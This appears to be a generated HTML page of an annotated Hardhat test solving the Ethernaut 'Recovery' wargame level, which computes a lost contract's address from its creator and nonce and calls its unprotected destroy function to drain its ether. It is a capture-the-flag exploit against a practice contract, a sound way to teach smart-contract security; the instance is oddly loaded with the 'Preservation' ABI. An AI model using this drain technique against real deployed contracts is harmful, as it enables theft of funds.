@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+
+<html>
+<head>
+  <title>Ethernaut 17: Recovery</title>
+  <meta http-equiv="content-type" content="text/html; charset=UTF-8">
+  <link rel="stylesheet" media="all" href="../public/stylesheets/normalize.css" />
+  <link rel="stylesheet" media="all" href="../docco.css" />
+</head>
+<body>
+  <div class="container">
+    <div class="page">
+
+      <div class="header">
+        <h1>Ethernaut 17: Recovery</h1>
+
+        
+      </div>
+      
+        
+        
+        <div class='highlight'><pre><span class="hljs-keyword">import</span> {ethers} <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;hardhat&#x27;</span>
+<span class="hljs-keyword">import</span> {<span class="hljs-title class_">BigNumber</span>, <span class="hljs-title class_">Contract</span>, providers, <span class="hljs-title class_">Signer</span>} <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;ethers&#x27;</span>
+
+<span class="hljs-keyword">import</span> {<span class="hljs-variable constant_">ETHERNAUT_ADDRESS</span>, expect, expectStatusOK} <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./testUtil&#x27;</span>
+
+<span class="hljs-keyword">const</span> <span class="hljs-variable constant_">LEVEL_ADDRESS</span> = <span class="hljs-string">&#x27;0x8d07AC34D8f73e2892496c15223297e5B22B3ABE&#x27;</span>
+<span class="hljs-keyword">const</span> <span class="hljs-variable constant_">INSTANCE_ADDRESS</span> = <span class="hljs-string">&#x27;0xDf5fE3788E3B7A69387A2e2C72486265be51487a&#x27;</span>
+
+<span class="hljs-title function_">describe</span>(<span class="hljs-string">&#x27;17 Recovery&#x27;</span>, <span class="hljs-function">() =&gt;</span> {
+  <span class="hljs-keyword">let</span> <span class="hljs-attr">ethernaut</span>: <span class="hljs-title class_">Contract</span>
+  <span class="hljs-keyword">let</span> <span class="hljs-attr">instance</span>: <span class="hljs-title class_">Contract</span>
+  <span class="hljs-keyword">let</span> <span class="hljs-attr">token</span>: <span class="hljs-title class_">Contract</span>
+  <span class="hljs-keyword">let</span> <span class="hljs-attr">signer</span>: <span class="hljs-title class_">Signer</span>
+  <span class="hljs-keyword">let</span> <span class="hljs-attr">signerAddress</span>: <span class="hljs-built_in">string</span>
+  <span class="hljs-keyword">let</span> <span class="hljs-attr">provider</span>: providers.<span class="hljs-property">Provider</span>
+
+  <span class="hljs-title function_">before</span>(<span class="hljs-keyword">async</span> () =&gt; {
+    ethernaut = <span class="hljs-keyword">await</span> ethers.<span class="hljs-title function_">getContractAt</span>(<span class="hljs-string">&#x27;Ethernaut&#x27;</span>, <span class="hljs-variable constant_">ETHERNAUT_ADDRESS</span>)
+    instance = <span class="hljs-keyword">await</span> ethers.<span class="hljs-title function_">getContractAt</span>(<span class="hljs-string">&#x27;Preservation&#x27;</span>, <span class="hljs-variable constant_">INSTANCE_ADDRESS</span>)
+
+    <span class="hljs-keyword">const</span> signers = <span class="hljs-keyword">await</span> ethers.<span class="hljs-title function_">getSigners</span>()
+    signer = signers[<span class="hljs-number">0</span>]
+    signerAddress = <span class="hljs-keyword">await</span> signer.<span class="hljs-title function_">getAddress</span>()
+    provider = signer.<span class="hljs-property">provider</span>
+  })</pre></div>
+      
+        
+        <p>On contract creation, the new contract’s address is calculated from the
+creator’s address and nonce. Here, the <code>Recovery</code> instance’s constructor
+creates the <code>SimpleToken</code>, so we know both the creator’s address and nonce.
+The nonce is 1, since this is the instance’s first transaction.</p>
+<p>From these values, the ‘forgotten’ token contract address is calculated
+as the last 20 bytes of the keccak256 hash of the RLP-coded address and nonce.
+(Recursive Length Prefix coding is used in the EVM to serialize arbitrarily
+nested arrays of binary data and is described e.g. <a href="https://eth.wiki/fundamentals/rlp">here</a>.)</p>
+<p>Once we know the token contract’s address, we can attach the <code>SimpleToken</code> ABI
+to it and call <code>destroy</code> to have the token contract send its remaining balance
+to us by way of <code>selfdestruct</code>.</p>
+
+        <div class='highlight'><pre>  <span class="hljs-title function_">it</span>(<span class="hljs-string">&#x27;calculates token address and and attaches to token&#x27;</span>, <span class="hljs-keyword">async</span> () =&gt; {
+    <span class="hljs-keyword">const</span> rlp = ethers.<span class="hljs-property">utils</span>.<span class="hljs-property">RLP</span>.<span class="hljs-title function_">encode</span>([instance.<span class="hljs-property">address</span>, <span class="hljs-string">&#x27;0x01&#x27;</span>])
+    <span class="hljs-keyword">const</span> hash = ethers.<span class="hljs-property">utils</span>.<span class="hljs-title function_">keccak256</span>(rlp)
+    <span class="hljs-keyword">const</span> tokenAddr = <span class="hljs-string">&#x27;0x&#x27;</span> + hash.<span class="hljs-title function_">slice</span>(<span class="hljs-number">26</span>)
+    token = <span class="hljs-keyword">await</span> ethers.<span class="hljs-title function_">getContractAt</span>(<span class="hljs-string">&#x27;SimpleToken&#x27;</span>, tokenAddr)
+    <span class="hljs-title function_">expect</span>(<span class="hljs-keyword">await</span> provider.<span class="hljs-title function_">getBalance</span>(tokenAddr)).<span class="hljs-property">to</span>.<span class="hljs-title function_">eq</span>(ethers.<span class="hljs-property">utils</span>.<span class="hljs-title function_">parseEther</span>(<span class="hljs-string">&#x27;0.5&#x27;</span>))
+  })
+
+  <span class="hljs-title function_">it</span>(<span class="hljs-string">&#x27;calls destroy on token passing signer address&#x27;</span>, <span class="hljs-keyword">async</span> () =&gt; {
+    <span class="hljs-keyword">const</span> tx = <span class="hljs-keyword">await</span> token.<span class="hljs-title function_">destroy</span>(signerAddress)
+    <span class="hljs-keyword">return</span> <span class="hljs-title function_">expectStatusOK</span>(tx)
+  })
+
+  <span class="hljs-title function_">it</span>(<span class="hljs-string">&#x27;verifies token has zero balance&#x27;</span>, <span class="hljs-keyword">async</span> () =&gt; {
+    <span class="hljs-title function_">expect</span>(<span class="hljs-keyword">await</span> provider.<span class="hljs-title function_">getBalance</span>(token.<span class="hljs-property">address</span>)).<span class="hljs-property">to</span>.<span class="hljs-title function_">eq</span>(<span class="hljs-number">0</span>)
+  })
+
+  <span class="hljs-title function_">it</span>(<span class="hljs-string">&#x27;is validated&#x27;</span>, <span class="hljs-keyword">async</span> () =&gt; {
+    <span class="hljs-keyword">return</span> <span class="hljs-title function_">expect</span>(ethernaut.<span class="hljs-title function_">submitLevelInstance</span>(instance.<span class="hljs-property">address</span>))
+      .<span class="hljs-property">to</span>.<span class="hljs-title function_">emit</span>(ethernaut, <span class="hljs-string">&#x27;LevelCompletedLog&#x27;</span>)
+      .<span class="hljs-title function_">withArgs</span>(signerAddress, <span class="hljs-variable constant_">LEVEL_ADDRESS</span>).<span class="hljs-property">eventually</span>
+  })
+})</pre></div>
+      
+    </div>
+  </div>
+</body>
+</html>
